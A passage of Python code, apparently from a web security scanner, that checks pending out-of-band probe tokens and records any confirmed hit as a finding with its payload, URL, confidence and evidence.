        for pend in self._oob_pending:
            sig = det.oob_detect(pend.token, self.oob)
            if sig.hit:
                f = Finding(
                    module=pend.module, point=pend.point, method=pend.method,
                    url=pend.url, payload=pend.payload, base_payload=pend.base_payload,
                    transform=pend.transform, confidence=sig.confidence,
                    detectors=["oob"], evidence=sig.evidence, tags=pend.tags,
                )
                out.append(f)
                if self.on_finding:
                    self.on_finding(f)
        return out
